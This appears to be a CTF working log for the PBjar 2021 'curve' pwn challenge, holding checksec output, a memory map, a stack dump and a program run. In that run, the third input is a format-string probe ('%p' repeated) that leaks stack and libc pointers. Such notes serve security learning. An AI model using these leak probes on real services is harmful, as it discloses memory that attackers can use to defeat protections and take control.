@@ -1,0 +1,66 @@
+mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_Curve/curve$ checksec curve
+[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x0000555555554000 0x0000555555555000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve
+0x0000555555555000 0x0000555555556000 r-xp	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve
+0x0000555555556000 0x0000555555557000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve
+0x0000555555557000 0x0000555555558000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve
+0x0000555555558000 0x0000555555559000 rw-p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve
+0x0000555555559000 0x000055555555a000 rw-p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve
+0x000055555555a000 0x000055555557b000 rw-p	[heap]
+0x00007ffff7e05000 0x00007ffff7e07000 rw-p	mapped
+0x00007ffff7e07000 0x00007ffff7e2c000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/libc-2.31.so
+0x00007ffff7e2c000 0x00007ffff7f77000 r-xp	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/libc-2.31.so
+0x00007ffff7f77000 0x00007ffff7fc1000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/libc-2.31.so
+0x00007ffff7fc1000 0x00007ffff7fc2000 ---p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/libc-2.31.so
+0x00007ffff7fc2000 0x00007ffff7fc5000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/libc-2.31.so
+0x00007ffff7fc5000 0x00007ffff7fc8000 rw-p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/libc-2.31.so
+0x00007ffff7fc8000 0x00007ffff7fce000 rw-p	mapped
+0x00007ffff7fce000 0x00007ffff7fd1000 r--p	[vvar]
+0x00007ffff7fd1000 0x00007ffff7fd2000 r-xp	[vdso]
+0x00007ffff7fd2000 0x00007ffff7fd3000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/ld-2.31.so
+0x00007ffff7fd3000 0x00007ffff7ff3000 r-xp	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/ld-2.31.so
+0x00007ffff7ff3000 0x00007ffff7ffb000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/ld-2.31.so
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/ld-2.31.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/ld-2.31.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
+
+
+gdb-peda$ x/80gx 0x7fffffffdec0
+0x7fffffffdec0:	0x0000000000000000	0x000055555555a2a0
+0x7fffffffded0:	0x4141414141414141	0x4141414141414141
+0x7fffffffdee0:	0x0000000000000a41	0x0000000000000000
+0x7fffffffdef0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdf00:	0x0000000000000000	0x0000000000000000
+0x7fffffffdf10:	0x0000000000f0b5ff	0x00000000000000c2
+0x7fffffffdf20:	0x00007fffffffdf47	0x0000555555555325
+0x7fffffffdf30:	0x0000000000000000	0x0000000000000000
+0x7fffffffdf40:	0x00005555555552e0	0x00005555555550b0
+0x7fffffffdf50:	0x00007fffffffe050	0x147ae65b00278600
+0x7fffffffdf60:	0x00005555555552e0	0x00007ffff7e2dd0a
+0x7fffffffdf70:	0x00007fffffffe058	0x0000000100000000
+0x7fffffffdf80:	0x0000555555555195	0x00007ffff7e2d7cf
+
+mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_Curve/curve$ ./curve 
+Oh no! Evil Morty is attempting to open the central finite curve!
+You get three inputs to try to stop him.
+
+Input 1:
+111111111
+111111111
+
+Input 2:
+2
+
+Input 3:
+AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+AAAAAAAA,0x55555555a2a0,0x80,0x7ffff7ef5e8e,0xa,0x7ffff7fc5be0,(nil),0x55555555a2a0,0x3131313131310a32,0xa31,(nil),(nil),(nil),(nil),(nil),(nil),0xf0b5ff,0xc2,0x7fffffffdfd7,0x555555555325,(nil),(nil),0x5555555552e0,0x5555555550b0,0x7fffffffe0e0
